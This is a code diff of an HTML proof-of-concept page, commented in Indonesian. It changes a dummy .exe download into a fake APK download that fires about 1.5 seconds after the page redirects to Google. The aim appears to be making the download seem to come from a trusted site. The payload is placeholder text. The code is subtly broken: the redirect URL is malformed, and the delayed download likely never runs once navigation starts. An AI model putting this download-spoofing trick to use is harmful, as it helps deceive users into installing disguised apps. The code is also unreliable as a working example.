@@ -2,46 +2,47 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Enhanced Download PoC</title>
+  <title>Enhanced APK Download PoC</title>
 </head>
 <body>
 
-<h3>Enhanced Download PoC</h3>
-<button id="start">Start Download</button>
+<h3>Enhanced APK Download PoC</h3>
+<button id="start">Start PoC</button>
 
 <script>
-document.getElementById('start').addEventListener('click', () => {
+document.getElementById('start').addEventListener('click', async () => {
   try {
-    // 1. Konten file: dummy + panjang untuk realistis
-    const content = `
-MZ
-PoC_File_Test
-Line 1: Hello
-Line 2: Testing
-Line 3: 1234567890
-Line 4: More content here
-Line 5: End of dummy file
+    console.log("PoC started from origin:", location.origin);
+
+    // 1. Redirect ke Google dulu
+    window.location.href = "https:/wwww.google.com";
+
+    // 2. Tunggu beberapa detik sebelum trigger download
+    setTimeout(() => {
+      // 3. Konten dummy APK
+      const content = `
+PK
+Fake_APK_File
+AndroidManifest.xml
+classes.dex
+res/layout/activity_main.xml
+END_OF_FILE
 `;
 
-    // 2. Encode konten supaya aman di data URI
-    const encoded = encodeURIComponent(content);
+      const encoded = encodeURIComponent(content);
 
-    // 3. Buat element <a> untuk download
-    const a = document.createElement('a');
-    a.href = 'data:application/octet-stream,' + encoded;
-    a.download = 'test.exe';
+      // 4. Buat element <a> untuk download
+      const a = document.createElement('a');
+      a.href = 'data:application/vnd.android.package-archive,' + encoded;
+      a.download = 'test.apk';
 
-    // 4. Append → click → remove untuk reliabilitas
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
 
-    console.log("Download triggered");
+      console.log("APK download triggered after redirect");
 
-    // 5. Redirect setelah delay kecil
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 2000);
+    }, 1500); // delay 1.5 detik agar halaman target muncul dulu
 
   } catch (e) {
     console.error("Error in PoC:", e);
